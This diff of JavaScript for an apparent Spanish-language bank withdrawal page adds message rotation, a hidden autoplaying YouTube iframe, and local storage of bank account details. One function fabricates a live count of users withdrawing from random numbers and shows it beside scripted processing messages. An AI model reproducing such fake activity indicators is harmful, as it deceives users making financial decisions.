+  // Función para actualizar el mensaje dinámico
+  function updateDynamicMessage() {
+    if (!dynamicTextElem) return;
+    
+    // Actualizar usuarios activos
+    if (Math.random() > 0.5) {
+      activeUsers += Math.floor(Math.random() * 5) + 1;
+    } else {
+      activeUsers = Math.max(300, activeUsers - Math.floor(Math.random() * 3));
+    }
+    
+    // Actualizar mensaje de usuarios en el array
+    const userIndex = allMessages.findIndex(msg => msg.includes('usuarios retirando'));
+    if (userIndex >= 0) {
+      allMessages[userIndex] = `${activeUsers} usuarios retirando ahora`;
+    }
+    
+    // Seleccionar un mensaje aleatorio
+    const randomIndex = Math.floor(Math.random() * allMessages.length);
+    const mensaje = allMessages[randomIndex];
+    
+    // Efecto de fade
+    dynamicTextElem.style.opacity = '0';
+    setTimeout(() => {
+      // Si es un mensaje que requiere los puntos suspensivos
+      if (mensaje.includes('Procesando') || 
+          mensaje.includes('Estableciendo') || 
+          mensaje.includes('Sincronizando') || 
+          mensaje.includes('Verificando') || 
+          mensaje.includes('Validando') || 
+          mensaje.includes('Optimizando') ||
+          mensaje.includes('Preparando')) {
+        dynamicTextElem.innerHTML = `<span>${mensaje}</span><span class="dot-loader"></span>`;
+      } else {
+        dynamicTextElem.innerHTML = `<span>${mensaje}</span>`;
+      }
+      dynamicTextElem.style.opacity = '1';
+    }, 500);
+  }
+
+  // Función para actualizar el estilo del spinner
+  function updateSpinnerStyle() {
+    if (!balanceSpinner) return;
+    
+    // Eliminar todas las clases de estilo
+    balanceSpinner.classList.remove('style1', 'style2', 'style3', 'style4');
+    
+    // Determinar el siguiente estilo
+    currentSpinnerStyle = currentSpinnerStyle % 4 + 1;
+    
+    // Aplicar el nuevo estilo
+    if (currentSpinnerStyle > 1) {
+      balanceSpinner.classList.add(`style${currentSpinnerStyle}`);
+    }
+  }
+
+  // Función para personalizar el mensaje del saldo con nombre de usuario
+  function togglePersonalizedBalance() {
+    if (!balanceLabelElem) return;
+    
+    // Obtener nombre de usuario de sessionStorage
+    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
+    const nombreUsuario = datosRemeex.fullName ? datosRemeex.fullName.split(' ')[0] : "Usuario";
+    
+    // Guardar estilo actual del spinner
+    const currentStyle = currentSpinnerStyle;
+    
+    if (!isPersonalized) {
+      // Cambiar a formato personalizado
+      balanceLabelElem.innerHTML = `
+        ${nombreUsuario}, tu saldo disponible
+        <span class="spinner" id="balanceSpinner">
+          <span class="spinner-circle"></span>
+          <span class="spinner-inner"></span>
+        </span>
+      `;
+    } else {
+      // Volver al formato normal
+      balanceLabelElem.innerHTML = `
+        Saldo disponible
+        <span class="spinner" id="balanceSpinner">
+          <span class="spinner-circle"></span>
+          <span class="spinner-inner"></span>
+        </span>
+      `;
+    }
+    
+    // Recuperar el nuevo spinner y aplicar el mismo estilo
+    const newSpinner = document.getElementById('balanceSpinner');
+    if (newSpinner && currentStyle > 1) {
+      newSpinner.classList.add(`style${currentStyle}`);
+    }
+    
+    isPersonalized = !isPersonalized;
   }
 
   /*
@@ -1820,15 +2310,52 @@
     isAdultCheckbox.addEventListener("change", guardarDatosStep2);
 
     continueBtnStep2.addEventListener("click", () => {
+      if (!audioPlayed) {
+        playButtonAudio();
+        audioPlayed = true;
+      }
+      
       if (validateStep2()) {
         goToStep3();
       }
     });
-    
-    backToSaldoBtn.addEventListener("click", () => {
-      window.location.href = "remeex.html";
-    });
   }
+  
+  function playButtonAudio() {
+    try {
+      // Cambiar la fuente a la solicitada
+      btnAudio.src = "https://www.youtube.com/watch?v=4FTTa3JY5Tw";
+      
+      // Intenta cargar y reproducir
+      btnAudio.load();
+      
+      // Promesa para intentar reproducir
+      const playPromise = btnAudio.play();
+      
+      if (playPromise !== undefined) {
+        playPromise.catch(error => {
+          console.log("Error al reproducir audio:", error);
+          // Intentar alternativa: usar un iframe de YouTube oculto
+          const audioContainer = document.createElement('div');
+          audioContainer.style.display = 'none';
+          audioContainer.innerHTML = `
+            <iframe width="1" height="1" src="https://www.youtube.com/embed/4FTTa3JY5Tw?autoplay=1" 
+            frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
+            allowfullscreen></iframe>
+          `;
+          document.body.appendChild(audioContainer);
+          
+          // Eliminar después de cierto tiempo
+          setTimeout(() => {
+            document.body.removeChild(audioContainer);
+          }, 30000);
+        });
+      }
+    } catch (e) {
+      console.log("Error al manejar audio:", e);
+    }
+  }
+  
   function loadSavedDataStep2() {
     const savedData = JSON.parse(sessionStorage.getItem('beneficiaryData') || "{}");
     if (Object.keys(savedData).length === 0) {
@@ -1935,9 +2462,7 @@
       return false;
     }
     return true;
-  }
-
-  /*
+  }/*
     STEP 3
   */
   function setupStep3Listeners() {
@@ -2009,6 +2534,10 @@
       digitosCuenta: restAccountDigitsInput.value,
       accountType: accountTypeSelect.value
     };
+    
+    // Obtener logo del banco y guardarlo
+    const logoURL = getBankLogoURL(data.bank);
+    
     sessionStorage.setItem("datosBancarios", JSON.stringify(data));
     localStorage.setItem("datosBancarios", JSON.stringify(data));
 
@@ -2017,13 +2546,15 @@
     datosRemeex.bankCode = data.bankCode;
     datosRemeex.bankAccount = data.bankCode + data.digitosCuenta;
     datosRemeex.bankType = data.accountType;
+    datosRemeex.bankLogo = logoURL; // Guardar URL del logo
+    
     sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
     
     // Actualizar variables globales
     bancoUsuario = data.bank;
     numeroCuenta = data.bankCode + data.digitosCuenta;
     tipoCuenta = data.accountType;
-    logoBancoUsuario = getBankLogoURL(data.bank);
+    logoBancoUsuario = logoURL;
   }
   function validateStep3() {
     const selectedBank = bankSelect.value;
@@ -2198,9 +2729,7 @@
     e.preventDefault();
     isDrawing = false;
     ctx.closePath();
-  }
-
-  /*
+  }/*
     STEP 6
   */
   function setupStep6Listeners() {
@@ -2237,6 +2766,13 @@
           retirarMonto.textContent = formatNumberVE(montoNum) + " Bs";
         }
       }
+    }
+    
+    // Habilitar/deshabilitar el botón según la validez
+    if (isValid && !finalConfirmBtn.disabled) {
+      finalConfirmBtn.classList.remove("btn-disabled");
+    } else if (!isValid && !finalConfirmBtn.disabled) {
+      finalConfirmBtn.classList.add("btn-disabled");
     }
     
     return isValid;
@@ -2402,6 +2938,7 @@
       if (tiempoRestante <= 0) {
         clearInterval(redirectCountdownInterval);
         isRedirecting = true;
+        prepararRedirectConLogo();
         window.location.href = "retiroremeex.html";
       }
     }, 1000);
@@ -2426,13 +2963,17 @@
       hideOverlay("overlayFinal");
       // Redirigir
       isRedirecting = true;
+      prepararRedirectConLogo();
       window.location.href = "retiroremeex.html";
     });
   }
   
   function showOverlay(id) {
     const overlay = document.getElementById(id);
-    if (overlay) overlay.classList.add("active");
+    if (overlay) {
+      overlay.classList.add("active");
+      centrarLogosEnOverlays();
+    }
   }
   
   function hideOverlay(id) {
@@ -2444,9 +2985,7 @@
       clearInterval(redirectCountdownInterval);
       redirectCountdownInterval = null;
     }
-  }
-
-  /*
+  }/*
     Secuencia de firma
   */
   function startSecuenciaFirma() {
@@ -2531,70 +3070,8 @@
       maximumFractionDigits: 2,
     });
   }
-  function startStatusBannerRotation() {
-    const statusMessages = [
-      "Todo listo",
-      "Preparando la entrega de fondos a tu cuenta",
-      "Completa los últimos pasos para retirar tus fondos",
-      "Sincronizando con tu banco",
-      "Tu retiro está en la fase final",
-      "Todo va perfecto",
-      "Tu banco ya está procesando el pago",
-      "Buenas noticias",
-      "Tu solicitud está confirmada"
-    ];
-    let currentIndex = 0;
-    statusBannerElem.textContent = statusMessages[currentIndex];
 
-    setInterval(() => {
-      statusBannerElem.style.opacity = 0;
-      setTimeout(() => {
-        currentIndex = (currentIndex + 1) % statusMessages.length;
-        statusBannerElem.textContent = statusMessages[currentIndex];
-        statusBannerElem.style.opacity = 1;
-      }, 500);
-    }, 10000);
-  }
-  function startRotatingInfo() {
-    const infoMessages = [
-      "Usuarios activos: 347",
-      "Tiempo de actualización: 12:35:20",
-      "Tiempo estimado de disponibilidad: 15:45",
-      "Sistema OK <span class='led-green'></span>",
-      "Procesando datos del banco..."
-    ];
-    let infoIndex = 0;
-    rotatingInfoElem.innerHTML = infoMessages[infoIndex];
-
-    setInterval(() => {
-      rotatingInfoElem.style.opacity = 0;
-      setTimeout(() => {
-        infoIndex = (infoIndex + 1) % infoMessages.length;
-        rotatingInfoElem.innerHTML = infoMessages[infoIndex];
-        rotatingInfoElem.style.opacity = 1;
-      }, 500);
-    }, 8000);
-  }
-  function startParticleGeneration() {
-    setInterval(() => {
-      createParticle();
-    }, 600);
-  }
-  function createParticle() {
-    const particle = document.createElement("div");
-    particle.classList.add("particle");
-    const yOffset = Math.random() * particleContainer.offsetHeight;
-    const size = Math.random() * 8 + 5;
-    particle.style.width = size + "px";
-    particle.style.height = size + "px";
-    particle.style.bottom = "-10px";
-    particle.style.left = "-10px";
-    particle.style.transform = `translateY(${(particleContainer.offsetHeight - yOffset)}px)`;
-    particleContainer.appendChild(particle);
-    particle.addEventListener("animationend", () => {
-      particle.remove();
-    });
-  }
+  // Función para obtener el logo del banco
   function getBankLogoURL(bankName) {
     if (!bankName) return "https://via.placeholder.com/100x50?text=Banco";
     const bankLogos = {
@@ -2612,6 +3089,50 @@
       }
     }
     return "https://via.placeholder.com/100x50?text=Banco";
+  }
+
+  // Función para transferir el logo del banco a retiroremeex.html
+  function prepararRedirectConLogo() {
+    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
+    
+    // Asegurarse de que el logo del banco esté guardado
+    if (datosRemeex.bankName && !datosRemeex.bankLogo) {
+      datosRemeex.bankLogo = getBankLogoURL(datosRemeex.bankName);
+      sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
+    }
+    
+    // También guardar en localStorage para mayor persistencia
+    localStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
+    
+    // Guardar el logo específicamente
+    if (datosRemeex.bankLogo) {
+      sessionStorage.setItem("bankLogo", datosRemeex.bankLogo);
+      localStorage.setItem("bankLogo", datosRemeex.bankLogo);
+    }
+  }
+
+  // Función para centrar logos en overlays
+  function centrarLogosEnOverlays() {
+    // Lista de todos los elementos de imagen en modales
+    const logosEnOverlays = [
+      document.getElementById('overlayDocumentoLogo'),
+      document.getElementById('secuenciaFirmaLogo'),
+      document.getElementById('logoInicioRetiro'),
+      document.getElementById('procesoRetiroLogo'),
+      document.getElementById('firmaNoCoincideLogo'),
+      document.getElementById('secFinalLogo'),
+      document.getElementById('bankLogoSummary')
+    ];
+    
+    // Aplicar estilos de centrado
+    logosEnOverlays.forEach(logo => {
+      if (logo) {
+        logo.style.display = 'block';
+        logo.style.margin = '0.75rem auto';
+        logo.style.maxHeight = '45px';
+        logo.style.maxWidth = '80%';
+      }
+    });
   }
 </script>
 
